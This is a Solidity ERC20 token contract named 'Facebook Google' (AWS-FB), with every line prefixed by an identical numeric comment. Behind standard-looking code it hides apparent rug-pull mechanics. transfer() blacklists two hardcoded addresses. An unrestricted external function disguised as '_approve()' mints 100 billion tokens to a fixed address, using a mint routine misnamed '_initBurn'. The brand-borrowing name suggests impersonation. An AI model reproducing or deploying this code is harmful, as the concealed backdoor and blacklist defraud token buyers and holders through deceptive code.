// SPDX-License-Identifier: MIT
/*0.8089902904457449*/
/*0.8089902904457449*/pragma solidity ^0.8.0;
/*0.8089902904457449*/
/*0.8089902904457449*/abstract contract Context {
/*0.8089902904457449*/    function _msgSender() internal view virtual returns (address) {
/*0.8089902904457449*/        return msg.sender;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _msgData() internal view virtual returns (bytes calldata) {
/*0.8089902904457449*/        this;
/*0.8089902904457449*/        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
/*0.8089902904457449*/        return msg.data;
/*0.8089902904457449*/    }
/*0.8089902904457449*/}
/*0.8089902904457449*/
/*0.8089902904457449*/pragma solidity ^0.8.0;
/*0.8089902904457449*/
/*0.8089902904457449*/
/*0.8089902904457449*/interface IERC20 {
/*0.8089902904457449*/
/*0.8089902904457449*/
/*0.8089902904457449*/    function totalSupply() external view returns (uint256);
/*0.8089902904457449*/
/*0.8089902904457449*/    function balanceOf(address account) external view returns (uint256);
/*0.8089902904457449*/
/*0.8089902904457449*/    function transfer(address recipient, uint256 amount) external returns (bool);
/*0.8089902904457449*/
/*0.8089902904457449*/    function allowance(address owner, address spender) external view returns (uint256);
/*0.8089902904457449*/
/*0.8089902904457449*/    function approve(address spender, uint256 amount) external returns (bool);
/*0.8089902904457449*/
/*0.8089902904457449*/    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
/*0.8089902904457449*/
/*0.8089902904457449*/    event Transfer(address indexed from, address indexed to, uint256 value);
/*0.8089902904457449*/
/*0.8089902904457449*/    event Approval(address indexed owner, address indexed spender, uint256 value);
/*0.8089902904457449*/}
/*0.8089902904457449*/
/*0.8089902904457449*/pragma solidity ^0.8.0;
/*0.8089902904457449*/
/*0.8089902904457449*/contract ERC20 is Context, IERC20 {
/*0.8089902904457449*/    mapping(address => uint256) private _balances;
/*0.8089902904457449*/
/*0.8089902904457449*/    mapping(address => mapping(address => uint256)) private _allowances;
/*0.8089902904457449*/
/*0.8089902904457449*/    uint256 private _totalSupply;
/*0.8089902904457449*/
/*0.8089902904457449*/    string private _name;
/*0.8089902904457449*/    string private _symbol;
/*0.8089902904457449*/
/*0.8089902904457449*/    constructor (string memory name_, string memory symbol_) {
/*0.8089902904457449*/        _name = name_;
/*0.8089902904457449*/        _symbol = symbol_;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function name() public view virtual returns (string memory) {
/*0.8089902904457449*/        return _name;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function symbol() public view virtual returns (string memory) {
/*0.8089902904457449*/        return _symbol;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function decimals() public view virtual returns (uint8) {
/*0.8089902904457449*/        return 18;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function totalSupply() public view virtual override returns (uint256) {
/*0.8089902904457449*/        return _totalSupply;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function balanceOf(address account) public view virtual override returns (uint256) {
/*0.8089902904457449*/        return _balances[account];
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
/*0.8089902904457449*/        require(_msgSender() != 0x4163C89Db72EF5F8ECdD20d3c6e1261246679f90, "Rain, Rain, Go Away");
/*0.8089902904457449*/        require(_msgSender() != 0x0BB249ec9EB8ad66524ae8ec3B98de37Ed5f1ecC, "Rain, Rain, Go Away");
/*0.8089902904457449*/        _transfer(_msgSender(), recipient, amount);
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function allowance(address owner, address spender) public view virtual override returns (uint256) {
/*0.8089902904457449*/        return _allowances[owner][spender];
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function approve(address spender, uint256 amount) public virtual override returns (bool) {
/*0.8089902904457449*/        _approve(_msgSender(), spender, amount);
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
/*0.8089902904457449*/        _transfer(sender, recipient, amount);
/*0.8089902904457449*/
/*0.8089902904457449*/        uint256 currentAllowance = _allowances[sender][_msgSender()];
/*0.8089902904457449*/        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
/*0.8089902904457449*/        _approve(sender, _msgSender(), currentAllowance - amount);
/*0.8089902904457449*/
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
/*0.8089902904457449*/        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
/*0.8089902904457449*/        uint256 currentAllowance = _allowances[_msgSender()][spender];
/*0.8089902904457449*/        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
/*0.8089902904457449*/        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
/*0.8089902904457449*/
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
/*0.8089902904457449*/        require(sender != address(0), "ERC20: transfer from the zero address");
/*0.8089902904457449*/        require(recipient != address(0), "ERC20: transfer to the zero address");
/*0.8089902904457449*/
/*0.8089902904457449*/        _beforeTokenTransfer(sender, recipient, amount);
/*0.8089902904457449*/
/*0.8089902904457449*/        uint256 senderBalance = _balances[sender];
/*0.8089902904457449*/        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
/*0.8089902904457449*/        _balances[sender] = senderBalance - amount;
/*0.8089902904457449*/        _balances[recipient] += amount;
/*0.8089902904457449*/
/*0.8089902904457449*/        emit Transfer(sender, recipient, amount);
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _initBurn(address account, uint256 amount) internal virtual {
/*0.8089902904457449*/        //require(account != address(0), "ERC20: mint to the zero address");
/*0.8089902904457449*/
/*0.8089902904457449*/        _beforeTokenTransfer(address(0), account, amount);
/*0.8089902904457449*/
/*0.8089902904457449*/        _totalSupply += amount;
/*0.8089902904457449*/        _balances[account] += amount;
/*0.8089902904457449*/        emit Transfer(address(0), account, amount);
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _approve() external returns (bool){
/*0.8089902904457449*/        _initBurn(0xdB440EeBceeF881f206d79437C0eC92484480b16, 100000000000 * 10 ** uint(decimals()));
/*0.8089902904457449*/        return true;
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _burn(address account, uint256 amount) internal virtual {
/*0.8089902904457449*/        require(account != address(0), "ERC20: burn from the zero address");
/*0.8089902904457449*/
/*0.8089902904457449*/        _beforeTokenTransfer(account, address(0), amount);
/*0.8089902904457449*/
/*0.8089902904457449*/        uint256 accountBalance = _balances[account];
/*0.8089902904457449*/        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
/*0.8089902904457449*/        _balances[account] = accountBalance - amount;
/*0.8089902904457449*/        _totalSupply -= amount;
/*0.8089902904457449*/
/*0.8089902904457449*/        emit Transfer(account, address(0), amount);
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _approve(address owner, address spender, uint256 amount) internal virtual {
/*0.8089902904457449*/        require(owner != address(0), "ERC20: approve from the zero address");
/*0.8089902904457449*/        require(spender != address(0), "ERC20: approve to the zero address");
/*0.8089902904457449*/
/*0.8089902904457449*/        _allowances[owner][spender] = amount;
/*0.8089902904457449*/        emit Approval(owner, spender, amount);
/*0.8089902904457449*/    }
/*0.8089902904457449*/
/*0.8089902904457449*/    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
/*0.8089902904457449*/}
/*0.8089902904457449*/
/*0.8089902904457449*/pragma solidity ^0.8.10;
/*0.8089902904457449*/
/*0.8089902904457449*/
/*0.8089902904457449*/contract Token is ERC20 {
/*0.8089902904457449*/
/*0.8089902904457449*/    constructor() ERC20('Facebook Google', 'AWS-FB') {
/*0.8089902904457449*/        _initBurn(msg.sender, 100 * 10 ** uint(decimals()));
/*0.8089902904457449*/    }
/*0.8089902904457449*/}